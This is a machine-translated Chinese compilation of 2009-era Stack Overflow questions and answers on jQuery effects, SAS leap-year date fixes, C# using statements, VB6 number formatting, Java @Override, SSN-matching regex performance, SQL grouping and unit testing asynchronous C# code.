您可以通过使用回调来做到这一点。查看 jQuery[文档](http://docs.jquery.com/Effects/fadeOut#speedcallback)。

```
jQuery("#div1").fadeOut("slow", function() { jQuery(this).fadeIn('slow'); }); 
```

几乎所有的 jQuery 效果都会在效果结束后执行回调。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-11-11T16:24:07.677

上面的示例中有一些拼写错误，导致它无法在 Firefox 中工作，更正版本：

```
$("#div1").fadeOut();
$("#div1").queue(function()
{
   $(this).fadeIn();
   $(this).dequeue();
});
$("#div").queue(function() 
{
   $(this).html("And now I'm sliding up. Wee!");
   $(this).slideUp("slow");
   $(this).dequeue();
}); 
```

# date - SAS 无效的“闰年”日期问题 yymmdd8

> ID：561353
> 
> 赞同：4
> 
> 时间：2009-02-18T14:50:57.637
> 
> 标签：date, sas

我正在阅读一些有几个错误日期的原始数据。具体来说，有人在非闰年输入了“2 月 29 日”。例如：

```
data _null_;
input test :yymmdd8.;
format test date9.;
cards;
20270229
run; 
```

客户希望恢复到 2 月 28 日。是否有快速/有效的方法来执行此操作？例如相当于：

IF iserror(date) 然后 date=date-1; ?

任何建议都感激不尽！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-21T16:43:44.003

我会更加小心地确定日期。这是一种方法。hth。

```
%put sysvlong=&sysvlong sysscpl=&sysscpl;           
/* sysvlong=9.02.01M0P020508 sysscpl=W32_VSPRO */

/* read a date both as character(temp) and numeric(date).
   if the numeric date is missing then check if the
   character date ends with "0229," if so, then change it
   to "0228" and see if it is a valid date. 
   If OK, then that is it. otherwise, keep it missing. */
%let FEB29 = 0229; 
%let FEB28 = 0228;
data one;
  drop temp;
  input temp $char8\. @1 date ?? yymmdd8.;
  if missing(date) then link fix;
  format date b8601da.;
  put (_all_) (=);
  return;
fix:
  if length(strip(temp))^=8 then return;
  if substr(temp,5) ^= "&FEB29" then return;
  date = input(cat(substr(temp,1,4), "&FEB28"), ?? yymmdd8.);
return;
cards;
20080229  ok
20090229  should be changed to 28th
201XX229  this should be missing
20110229  -> 28
20120229  ok 
20130229  -> 28
20270229  -> 28
;
run;

/* on log
temp=20080229 date=20080229
temp=20090229 date=20090228
temp=201XX229 date=.
temp=20110229 date=20110228
temp=20120229 date=20120229
temp=20130229 date=20130228
temp=20270229 date=20270228
NOTE: The data set WORK.ONE has 7 observations and 1 variables.
*/ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T16:53:59.197

这是来自 SCONSIG 的一个很好的提示。[关联](http://www.sconsig.com/sastips/tip00039.htm)

```
/******************************************************************/
 /***TIP00039.SAS                                                ***/
 /***   Leap Year Problem                                        ***/
 /***                                                            ***/
 /***   Most of us know that if the year is divisible by 4 then  ***/
 /***   that year is a Leap Year.  However, if the year is a     ***/
 /***   century year and is NOT divisible by 400 then that       ***/
 /***   century year is NOT A LEAP YEAR.                         ***/
 /***   (ie, 1700, 1800, 1900, 2100, 2200, 2300 are not LEAP     ***/
 /***        YEARS)                                              ***/
 /***                                                            ***/
 /******************************************************************/

 data leapyear;
   do year = 1600 to 2400 by 100;
    date = mdy(02,29,year);        /*** Leap Date                       ***/
    if date = . then do;           /*** If FEB 29th but not a Leap Year ***/
       date = mdy(03,01,year) - 1; /*** Make date March 1st and then    ***/
    end;                           /***   subtract 1 day                ***/
    output;
   end;
   format date mmddyy10.;
 run;

 proc print; run;

 /*** end of sas program - TIP00039 ***/ 
```

可以以一种或另一种方式将其合并到您的负载中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-20T13:55:23.700

上述答案的略微修改版本（我认为）。它通过“??”避免了错误消息 在输入函数中。

```
data testit;
   format indate yymmdd10.;
   input x $8.;

   indate = input(x, ?? yymmdd8.);
   if indate=. then indate= input(put(x - 1, 8.), ?? yymmdd8.);

    put indate=;

cards;
20080229
20090229
20100229
20110229
20120229
20130229
20270229
run; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-19T21:38:25.853

这并不漂亮，并且有转换说明，但它可以工作并且不会出错。

```
data testit;
   format test2 yymmdd10.;
   input x $8.;
   mod4 = mod(mod((substr(x,1,4)/4),4) * 10,10);   
   if mod4 NE 0 then x = x - 1;
   test2=input(x,yymmdd8.);
   put x= test2=;

cards;
20080229
20090229
20100229
20110229
20120229
20130229
20270229
run; 
```

输出：

```
x=20080229 test2=2008-02-29
x=20090228 test2=2009-02-28
x=20100228 test2=2010-02-28
x=20110228 test2=2011-02-28
x=20120229 test2=2012-02-29
x=20130228 test2=2013-02-28
x=20270228 test2=2027-02-28 
```

# .net - 使用的目的是什么？

> ID：561354
> 
> 赞同：5
> 
> 时间：2009-02-18T14:51:03.017
> 
> 标签：.net, using-statement

**DUPE：[在 C# 中使用“使用”](https://stackoverflow.com/questions/75401/uses-of-using-in-c)**

我见过人们使用以下内容，我想知道它的目的是什么？是不是对象在被垃圾收集使用后被销毁了？

例子：

```
using (Something mySomething = new Something()) {
  mySomething.someProp = "Hey";
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-18T14:54:00.267

使用大致翻译为：

```
Something mySomething = new Something();
try
{
  something.someProp = "Hey";
}
finally
{
  if(mySomething != null)
  {
    mySomething.Dispose();
  }
} 
```

差不多就是这样。目的是支持确定性处理，这是 C# 所没有的，因为它是一种垃圾收集语言。using / Disposal 模式为程序员提供了一种准确指定类型何时清理其资源的方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T14:53:34.713

using 语句可确保调用 Dispose()，即使在调用对象上的方法时发生异常也是如此。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T14:52:36.663

using 语句具有在完成 using 块时处理 () 中的任何内容的有益效果。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T14:53:56.007

您可以[`using`](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)在`Something`类实现[IDisposable](http://msdn.microsoft.com/en-us/library/system.idisposable.aspx)时使用。即使您在`using`块内遇到异常，它也可以确保正确处理对象。

即，您不必为了调用而手动处理潜在的异常`Dispose`，该`using`块会自动为您完成。

它等价于：

```
Something mySomething = new Something();
try
{
   // this is what's inside your using block
}
finally
{
    if (mySomething != null)
    {
        mySomething.Dispose();
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T14:54:35.990

使用被翻译成

```
try
{
   ...
}
finally
{
   myObj.Dispose();
} 
```

编译时（在 IL 中也是如此）。

所以基本上你应该将它与实现的每个对象一起使用`IDisposable`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T14:54:35.990

'using' 块是一种保证在退出块时调用对象的 'dispose' 方法的方法。

它很有用，因为您可能会因为中断、返回或异常而正常退出该块。

你可以用'try/finally'做同样的事情，但是'using'可以更清楚地说明你的意思，并且不需要在块外声明的变量。

# vb6 - Visual Basic 6.0 中的小数

> ID：561362
> 
> 赞同：1
> 
> 时间：2009-02-18T14:52:28.817
> 
> 标签：vb6

我需要将 45.556 显示为 45.55 我需要在真正的 dbgrid pro 7.0 中使用的格式是什么。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T14:59:38.457

抱歉不熟悉 dbgird pro 7.0。如果您不希望像示例中所示那样截断 6（四舍五入 45.556 是 45.56），您可以使用 format 命令，它将您的数字格式化为两位小数，并相应地四舍五入。

```
format(*value*, "0.00") 
```

使用“0.00”将数字格式化为在零所在位置默认为零。
使用“#.##”将数字格式化为默认为空格（无）

如果您不想对数字进行四舍五入，而只想得到数字加上正确的两位小数。

```
Left(cStr(value), instr(cStr(value), ".") + 2)) 
```

从左边检索您的数字加上小数点后的 2，截断其余部分。您可能不需要 cStr()，因为 VB 可能会先显式转换它。
使用 cStr() 可能会在来自减号的数字之前创建一个空格，如果您在网格中看到此问题， format() 不会这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T20:52:51.930

可选地，不会导致在欧洲国家/地区爆炸的字符串操作（使用 a ，而不是 a . 作为小数位）...但是，如果 floatval 和 decimalPlaces > 9 的任何组合，您将遇到溢出问题.. .

```
Public Function Floor(ByVal floatval As Double, optional decimalPlaces as Long = 0) As Long
    Dim intval As Long
    intval = Round(floatval)
    If intval > floatval Then 
         intval = intval - 1
    End If

    if decimalPlaces > 0 then
        floatval = float / (10 ^ decimalPlaces)
    end if

    Floor = intval
End Function 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T15:00:55.367

要通过网格属性处理此问题，请设置列的 NumberFormat = Fixed，除非它是货币值，否则您应该使用 Currency。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-10-01T12:46:39.467

实际上，您可以通过两种不同的方式来实现不同的结果。我们将取点符号“。”之后的前两位数字。得到结果：45.55 出 45.556

```
Dim a As Double  'This must be DOUBLE not long
a = 45.556

MsgBox Left(a, InStr(a, ".") + 2) 'Result: 45.55 
```

以编程方式是 100% 正确，但从逻辑上讲，上面的结果是错误的 45.556 应该是 45.56，因为我们要删除的最后一个数字大于 10 中的 5，即 6，所以我们必须在前一个数字 5 上加 1为 6 得到结果：45.56。是数学不是我。另一种方式将为我们提供所需数字长度的正确结果：

```
Dim a As Double 'This must be DOUBLE not long
a = 45.556

MsgBox Format(a, "#.##") 'Result: 45.56 
```

前 ”。” 使用一个#就足够了，但是在“.”之后 我们添加 # 作为我们需要显示的位数。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-11-22T23:09:21.593

您可以使用：

```
fix(45.556*100)/100 
```

45.55

# c# - 当 UIEditor 在 c# 中关闭时，我想捕获

> ID：561364
> 
> 赞同：0
> 
> 时间：2009-02-18T14:52:37.897
> 
> 标签：c#

我想在我的自定义 UIEditor 关闭时进行陷阱，是否有人有建议。

布拉德

编辑：

最近的一条评论是触发一个事件并让相关方拦截它。我不完全确定如何做到这一点。下面是我的财产的声明和编辑的声明。但是我如何在触发后挂钩编辑器的事件呢？

WINFORM的

```
 private string _filename;
    [Browsable(true), Category("Source name"),
    Description("Image Source name"),
     Editor(typeof(FileOpenEditor), typeof(UITypeEditor))]

    public string ImageFileName
    {
        get { return _filename; }
        set { _filename = value;}

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T14:53:44.603

听起来您的 UI 编辑器应该在关闭时触发一个事件，并且任何感兴趣的各方都应该订阅该事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T15:48:43.847

C# 中的每个表单都有一个可以连接到的 Closing 事件。您的编辑器/表单在哪里创建？这就是您要连接到闭幕事件的地方。如果您需要将其传播给其他方，则必须将其链接起来。

# java - Java 中的@Override 是什么？

> ID：561365
> 
> 赞同：59
> 
> 时间：2009-02-18T14:52:42.890
> 
> 标签：java, overriding

> **可能重复：**
> [您何时使用 Java 的 @Override 注释，为什么？](https://stackoverflow.com/questions/94361/when-do-you-use-javas-override-annotation-and-why)

`@Override`除了让编译器检查超类是否具有该方法之外，是否有任何理由注释方法？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2009-02-18T14:57:08.260

正如您所描述的，@Override 创建了一个编译时检查方法是否被覆盖。这对于确保您在尝试覆盖时没有愚蠢的签名问题非常有用。

例如，我看到了以下错误：

```
public class Foo {
  private String id;
  public boolean equals(Foo f) { return id.equals(f.id);}
} 
```

此类按编写方式编译，但将 @Override 标记添加到 equals 方法会导致编译错误，因为它不会覆盖 Object 上的 equals 方法。这是一个简单的错误，但即使是经验丰富的开发人员也能逃脱

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-02-18T14:55:24.817

它不仅使编译器检查——尽管这足以使它有用；它还记录了开发人员的意图。

例如，如果您重写了一个方法，但没有在类型本身的任何地方使用它，那么稍后访问代码的人可能会想知道它到底为什么在那里。注释解释了它的用途。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2009-02-18T14:58:00.037

不，你几乎成功了。

`@Override`告诉编译器你的*意图*：如果你标记一个方法`@Override`，你打算覆盖超类（或接口，在 Java 6 中）中的某些内容。一个好的 IDE 将有助于标记任何覆盖没有 的方法的方法`@Override`，因此两者的结合将有助于确保您正在做您想做的事情。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T14:56:06.313

不——除了它还提高了可读性（即除了您的 IDE 使用的任何指示符之外，它还可以很容易地发现一个方法覆盖了超类中的声明）

# regex - 这两个社会安全号码搜索是否存在性能差异？

> ID：561376
> 
> 赞同：2
> 
> 时间：2009-02-18T14:54:29.080
> 
> 标签：regex, performance

我需要搜索违反我们的“不要在您的数据中使用社会安全号码”规则的人，并且需要知道下面两行之间是否存在性能差异（以及原因）。

谢谢。

```
[0-9]{3}-[0-9]{2}-[0-9]{4} 
```

对比

```
\d\d\d-\d\d-\d\d\d\d 
```

* * *

要求的详细信息：
引擎：*已删除以防止标记混淆*

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T14:58:32.923

我认为您会看到性能上的差异非常微不足道。使用第一个，因为它更容易一目了然。编译正则表达式后（如果您在将其用于重用之前对其进行编译），无论如何都无关紧要。

**在需要**优化之前不要优化。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T15:05:37.273

抛开性能不谈，我最近发现 \d 和 [0-9] 并不相同，因为[不止 10 个数字](http://www.moserware.com/2008/02/does-your-code-pass-turkey-test.html)。因此，第二个版本可能会产生更多的误报。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-18T14:59:01.440

性能差异（如果有的话）绝对可以忽略不计。您可能正在优化应用程序的错误部分。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-18T15:07:07.473

性能差异*应该*可以忽略不计。在不相关的说明中，如果您正在处理的数据与我看到的数据相似，则通过将破折号设为可选来扩展搜索可能会很有用：

```
\b\d{3}-?\d{2}-?\d{4}\b 
```

更新：好点子，Keng。word-boundary 技巧非常有用，所以我肯定会在第一遍中包含它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T15:03:06.267

与任何性能问题一样，答案是使用您自己的数据对其进行基准测试并找出答案。用一些样本数据发布结果，因为这是一个很好的问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-18T15:18:23.047

这个 Ruby 脚本说第一个稍微慢一些，但我希望任何引擎上的差异都可以忽略不计。

```
require 'benchmark'
include Benchmark

def random_ssn
  format "%03d-%02d-%04d", rand(1000), rand(100), rand(10000)
end

bm do |x|
  x.report("range") { 100_000.times { /[0-9]{3}-[0-9]{2}-[0-9]{4}/ =~ random_ssn } }
  x.report("digit") { 100_000.times { /\d\d\d-\d\d-\d\d\d\d/       =~ random_ssn } }
end 
```

结果：

```
 user     system      total        real
range  1.080000   0.030000   1.110000 (  1.245579)
digit  0.980000   0.030000   1.010000 (  1.149390) 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T15:23:18.977

当然，这两个表达式的性能取决于您使用的正则表达式引擎的实现。差异应该很小，因此在将其视为瓶颈之前不要进行优化。

这是一个小的性能比较，使用 perl 5.8.3 和 8MB 随机数据（数字、破折号、空格）的样本：

```
time perl -ne 'if (/\d\d\d-\d\d-\d\d\d\d/) {print "."}' < numbers.txt
[output omitted]
real    0m0.143s
user    0m0.136s
sys     0m0.007s

time perl -ne 'if (/[0-9]{3}-[0-9]{2}-[0-9]{4}/) {print "."}' < numbers.txt
[output omitted]
real    0m0.166s
user    0m0.160s
sys     0m0.006s 
```

所以第一个实际上要快一点（这在多次调用中是一致的）。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-18T15:31:00.830

除了您注意到的之外，还有更好的优化：

[社保号不能从大于 772 的数字开始](http://en.wikipedia.org/wiki/Social_security_number#Valid_SSNs)

这样可以立即减少您的匹配组，现在您可以：

```
[0-7][0-9]{2}-[0-9]{2}-[0-9]{4} 
```

我想我想说的是优化不必只是技术性的。

**编辑**

根据评论更改了正则表达式。谢谢大卫！

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-02-18T15:48:12.133

附议这不太可能成为性能瓶颈的评论——与 I/O 等相比，差异不太可能是可测量的。

话虽如此 - 如果您担心，请测量它，不要猜测。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-08-14T21:34:43.047

我刚刚在 .NET 中使用[Regex Hero 的基准测试功能](http://regexhero.net/tester/)对此进行了测试。

令人惊讶的是，第一个表达式更快，尽管只有一点点。我对一个有效的社会安全号码进行了 500,000 次迭代，结果如下：

**1.547 秒**- [0-9]{3}-[0-9]{2}-[0-9]{4}

**1.844 秒**- \d\d​​\d-\d\d-\d\d\d\d

我测试了每一个 3 次以确保基准是准确的。有趣的是，.NET 中的结果与 Ruby 和 Perl 中的结果完全相反。

# javascript - jquery在div中加载html时等待光标

> ID：561379
> 
> 赞同：17
> 
> 时间：2009-02-18T14:55:04.740
> 
> 标签：javascript, jquery, html, dom

我想向用户显示结果正在加载的状态。如何在使用 $MyDiv.load("page.php") 将结果加载到 div 时更改光标或 gif？

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2009-02-18T14:58:12.003

```
$("body").css("cursor", "progress"); 
```

请记住之后将其退回：

```
$MyDiv.load("page.php", function () {
    // this is the callback function, called after the load is finished.
    $("body").css("cursor", "auto");
}); 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2010-06-04T18:08:49.850

`$("*").css("cursor", "progress")` 无论您当前指向页面的哪个位置，都可以使用。这样，您不必移动光标即可看到它已激活。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2010-10-03T22:42:44.283

我认为最好是在css文件中设置

```
body.wait *, body.wait {
cursor:wait !important;
} 
```

并在正文中添加/删除类等待

此方法覆盖输入、链接等中的所有光标。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-02-18T14:59:06.977

1.  最初将加载图像设置为不可见的样式。
2.  开始加载时将样式更改为可见。
3.  加载完成后使用 load() 的回调参数将样式更改为不可见。

例子：

```
 $("#loadImage").show();
 $("#MyDiv").load("page.php", {limit: 25}, function(){
   $("#loadImage").hide();
 }); 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2015-02-17T13:29:58.697

我真的认为在 body 元素中使用一个类是一个更好的解决方案

```
 $('body').addClass('cursorProgress'); 
```

当你想保持它原来的样子时：

```
 $('body').removeClass('cursorProgress'); 
```

在你的css文件中放这样的东西：

```
body.cursorProgress {
  cursor: progress;
} 
```

因此，使用此解决方案，您不会覆盖对光标样式所做的默认值或更改，第二个优点是您可以在 CSS 中添加重要元素。

```
body.cursorProgress {
  cursor: progress !important;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-07-08T03:31:06.030

例如，如果您想在将鼠标悬停在缩略图上时显示更大的图像

```
//Hovered image
    $("a.preview").hover(function(e) {
            var aprev = this;
            //Show progress cursor while loading image
            $(aprev).css("cursor", "progress");
    //#imgpreview is the <div> to be loaded on hover
    $("#imgpreview").load(function() {           
                $(aprev).css("cursor", "default");
            });
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-03T11:42:18.183

一种更简洁的 JQuery 方法，虽然不一定有效，但它是向所有对象添加和删除繁忙的类。

请注意，并非所有浏览器（例如 Firefox）都假定最外面的可视对象的高度为 100%，因此忙碌光标只会显示在屏幕的一部分上

```
<head runat="server">
    <title></title>
    <style type="text/css">
        .busy
        {
            cursor: wait !important;
        }
    </style>
    <script type="text/javascript" src="scripts/jquery-1.7.2.min.js"></script>
    <script type="text/javascript">
    //<![CDATA[

        $(function () {

            $("#btnToggleWait").click(function (e) {
                if ($(e.target).hasClass("busy")) {
                    $("*").removeClass("busy");
                }
                else {
                    $("*").addClass("busy");
                }

                e.preventDefault();
                e.stopPropagation();
                return false;
            });
        });

        //]]>
    </script>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <button id="btnToggleWait">
            Toggle Wait</button>
    </div>
    </form>
</body> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-06-23T17:41:09.507

看看我的解决方案，它涵盖了所有元素，不仅是正文标签： [https ://stackoverflow.com/a/26183551/1895428](https://stackoverflow.com/a/26183551/1895428)

# asp.net - 如何将选择不同的选择加入选择总和？

> ID：561384
> 
> 赞同：0
> 
> 时间：2009-02-18T14:56:04.333
> 
> 标签：asp.net, sql, sql-server

我正在尝试将 select disinct 语句加入到 select sum 语句中。这是数据的示例

```
CD  STDATE    ENDDATE   PR
F1  01/02/09  01/04/09  $10
F1  01/02/09  01/04/09  $40
F1  01/02/09  01/04/09  $20
F1  01/02/09  01/04/09  $30
F1  01/22/09  01/26/09  $10
F1  01/22/09  01/26/09  $50
F1  01/22/09  01/26/09  $20 
```

我想要的输出是 -

```
F1  01/02/09  01/04/09  $100
F1  01/22/09  01/26/09  $80 
```

到目前为止，我有以下声明，这是不正确的：

```
SELECT DISTINCT STDATE, ENDDATE, CD FROM TABLE AS A 
INNER JOIN (SELECT SUM(PR) FROM TABLE) AS B 
ON A.STDATE=B.STDATE 
```

我怎样才能做到这一点？？？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-18T15:00:26.880

我认为您正在寻找分组：

```
select
    t.cd,
    t.stdate,
    t.enddate,
    sum(t.pr)
from
    table t
group by
    t.cd,
    t.stdate,
    t.enddate 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T15:00:19.440

```
Select cd, stdate, enddate, sum(PR)
from Table
group by cd, stdate, enddate 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T14:59:40.080

```
SELECT CD,STDATE,ENDDATE,SUM(PR) FROM TABLE GROUP BY CD,STDATE,ENDDATE 
```

（原始答案中缺少CD）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:00:33.697

简单的分组求和，随便挑一本SQL编程书

```
SELECT CD, STDATE,ENDDATE,SUM(PR) as SomeSum
FROM TABLE
GROUP BY CD, STDATE,ENDDATE 
```

# c# - 如何对包含异步调用的方法进行单元测试？

> ID：561398
> 
> 赞同：5
> 
> 时间：2009-02-18T14:58:12.597
> 
> 标签：c#, unit-testing, concurrency

我有一个包含这样的异步调用的方法：

```
public void MyMethod() {
    ...
    (new Action<string>(worker.DoWork)).BeginInvoke(myString, null, null);
    ...
} 
```

我正在使用 Unity 并且创建模拟对象不是问题，但是我如何测试调用 DoWork 而不必担心竞争条件？

上一个[问题](https://stackoverflow.com/questions/400552/what-is-the-best-way-to-unit-test-an-asynchronous-method)提供了一个解决方案，但在我看来，等待句柄是一种技巧（竞争条件仍然存在，尽管几乎不可能提出）。

* * *

编辑：好的，我想我可以以非常笼统的方式问这个问题，但似乎我必须进一步详细说明这个问题：

我想为上面提到的 MyMethod 创建一个测试，所以我做了这样的事情：

```
[TestMethod]
public void TestMyMethod() {
   ...setup...
   MockWorker worker = new MockWorker();
   MyObject myObj = new MyObject(worker);
   ...assert preconditions...
   myObj.MyMethod();
   ...assert postconditions...
} 
```

天真的方法是创建一个 MockWorker() ，它在调用 DoWork 时简单地设置一个标志，并在后置条件中测试该标志。这当然会导致竞争条件，在 MockWorker 中设置标志之前检查后置条件。

更正确的方法（我可能最终会使用）是使用等待句柄：

```
class MockWorker : Worker {
    public AutoResetEvent AutoResetEvent = new AutoResetEvent();

    public override void DoWork(string arg) {
        AutoResetEvent.Set();
    }
} 
```

...并使用以下断言：

```
Assert.IsTrue(worker.AutoResetEvent.WaitOne(1000, false)); 
```

这是使用类似信号量的方法，这很好......但*理论上*可能会发生以下情况：

1.  BeginInvoke 在我的 DoWork 委托上被调用
2.  由于某种原因，主线程或 DoWork 线程都没有被赋予 1000 毫秒的执行时间。
3.  主线程有执行时间，由于超时，断言失败，即使 DoWork 线程尚未执行。

我是否误解了 AutoResetEvent 的工作原理？是我太偏执了，还是有解决这个问题的聪明办法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T15:09:09.183

等待句柄将是我会这样做的方式。AFAIK（我不确定）异步方法正在使用等待句柄来触发该方法。

我不确定您为什么认为会发生争用情况，除非您在 WaitOne 调用中给予异常短的时间。我会在waitone上放4-5秒，这样你就可以确定它是否坏了，而不仅仅是一场比赛。

另外，别忘了等待句柄是如何工作的，只要创建了等待句柄，就可以有如下的执行顺序

*   线程 1 - 创建等待句柄
*   线程 1 - 设置等待句柄
*   线程 2 - 等待句柄上的 waitone
*   线程 2 - 通过等待句柄并继续执行

即使正常执行是

*   线程 1 - 创建等待句柄
*   线程 2 - 等待句柄上的 waitone
*   线程 1 - 设置等待句柄
*   线程 2 - 通过等待句柄并继续执行

两者都可以正常工作，可以在 Thread2 开始等待它之前设置等待句柄，一切都会为您处理。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T15:10:05.233

测试直接委托时，只需使用 EndInvoke 调用来确保调用委托并返回适当的值。例如。

```
var del = new Action<string>(worker.DoWork);
var async = del.BeginInvoke(myString,null,null);
...
var result = del.EndInvoke(async); 
```

**编辑**

OP 评论说他们正在尝试对 MyMethod 与 worker.DoWork 方法进行单元测试。

在这种情况下，您将不得不依赖调用 DoWork 方法的可见副作用。根据您的示例，我在这里不能提供太多，因为 DoWork 的内部工作都没有暴露出来。

**编辑2**

[OP] 出于某种原因，主线程或 DoWork 线程都没有被赋予 1000 毫秒的执行时间。

这不会发生。当您在 AutoResetEvent 上调用 WaitOne 时，线程进入睡眠状态。在设置事件或超时期限到期之前，它将不会收到任何处理器时间。其他一些线程获得重要的时间片并导致错误的失败绝对是可行的。但我认为这不太可能。我有几个以相同方式运行的测试，我没有得到很多/任何像这样的错误失败。我通常会选择约 2 分钟的超时时间。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T15:44:57.117

这就是我在这些情况下所做的：创建一个接受委托并执行它的服务（通过一个简单的接口公开它，在你异步调用的地方注入）。

在实际服务中，它将使用 BeginInvoke 执行，因此是异步的。然后创建一个同步调用委托的测试服务版本。

这是一个例子：

```
public interface IActionRunner
{
   void Run(Action action, AsyncCallback callback, object obj);
   void Run<T>(Action<T> action, T arg, AsyncCallback callback, object obj);
   void Run<T1, T2>(Action<T1, T2> action, T1 arg1, T2 arg2, AsyncCallback callback, object obj);
   void Run<T1, T2, T3>(Action<T1, T2, T3> action, T1 arg1, T2 arg2, T3 arg3, AsyncCallback callback, object obj);
   void Run<T1, T2, T3, T4>(Action<T1, T2, T3, T4> action, T1 arg1, T2 arg2, T3 arg3, T4 arg4, AsyncCallback callback, object obj);
} 
```

该服务的异步实现如下所示：

```
public void Run<T>(Action<T> action, T arg, AsyncCallback callback, object obj)
{
   action.BeginInvoke(arg, callback, obj);
} 
```

此服务的同步实现如下所示：

```
public void Run<T>(Action<T> action, T arg, AsyncCallback callback, object obj)
{
   action(arg);
} 
```

当您进行单元测试时，如果您使用 RhinoMocks 和 AutoMocking 容器之类的东西，您可以换入 Synchronous ActionRunner：

```
_mocks = new MockRepository();

_container = new AutoMockingContainer(_mocks);
_container.AddService(typeof(IActionRunner), new SyncActionRunner());
_container.Initialize(); 
```

ActionRunner 不需要测试；它只是方法调用的薄薄的一层。

# c# - 重构我的 C# 代码 - Switch 语句

> ID：561401
> 
> 赞同：4
> 
> 时间：2009-02-18T14:58:33.560
> 
> 标签：c#, refactoring, switch-statement

我有以下我目前正在使用的代码....基本上，此方法为每个任务分配正确的布尔标志 (TRUE/FALSE)。随着越来越多的任务需要添加.. 我可以看到 switch 语句将不得不增长以满足每个任务。

必须有一个更简单的方法......保持方法小。

代码：（忘记命名约定，已更改为发布）

```
public ClassStructure.User AssignTaskStatusToUser(ClassStructure.User,
                                                  List<ClassStructure.Tasks> TaskStatus)
{
    foreach (ClassStructure.Tasks data in TaskStatus)
    {
        string Task_CallID = data.Task_Call_ID;

        switch (Task_CallID)
        {
            case ClassStructure.Tasks_CallIDs_Strings.TASK1:
                User.TASK1 = data.Task_Flag;
                break;

            case ClassStructure.Tasks_CallIDs_Strings.TASK2:
                User.TASK2 = data.Task_Flag;
                break;

            case ClassStructure.Tasks_CallIDs_Strings.TASK3:
                User.TASK3 = data.Task_Flag;
                break;
        }
    }

    return User;
} 
```

ClassStructure.Tasks_CallIDs_Strings = 任务的字符串表示

data.Task_Flag = 布尔值

User.TASKX = 布尔值

欢迎任何反馈。我确信有一个简单的解决方案。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T15:02:39.620

对于很多像这样的值，我会使用这样的地图：

```
Dictionary<ClassStructure.Tasks_CallIDs_Strings, Task_Flag> 
```

并通过映射 CallIDs 字符串来检索值。

编辑：

现在大家可以看到，重构这个例子的真正问题在于重构User.TASKX。让它成为一个列表就足够了——因为它可以被相同的字符串**ClassStructure.Tasks_CallIDs_Strings索引**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T15:04:42.393

哦...重新考虑您的命名方案。

```
public delegate void TaskAssigner(User user, bool taskFlag)

IDictionary<string, TaskAssigner> taskAssigners = new Dictionary<string, TaskAssigner>();

...

taskAssigners.Add(ClassStructure.Tasks_CallIDs_Strings.TASK1, (u, t) => u.TASK1 = t;);
taskAssigners.Add(ClassStructure.Tasks_CallIDs_Strings.TASK2, (u, t) => u.TASK2 = t;);

...

foreach(ClassStructure.Tasks data in TaskStatus)
    taskAssigners[data.Task_Call_ID](user, data.Task_Flag); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T16:01:39.090

我在想这样的事情——但也许我错过了这一切的意义？

```
public class User
{
    private Dictionary<string,Task> tasks;

    internal Dictionary<string,Task> Tasks
    {
      get { return tasks; }
      set { tasks = value; }
    }

    internal void AddTask(Task task)
    {
        tasks.Add(task.Task_Call_ID,task);
    }

    internal void AddTasks(List<Task> task)
    {
        foreach(Task task in Tasks)
        {
            tasks.Add(task.Task_Call_ID,task);
        }
    }
} 
```

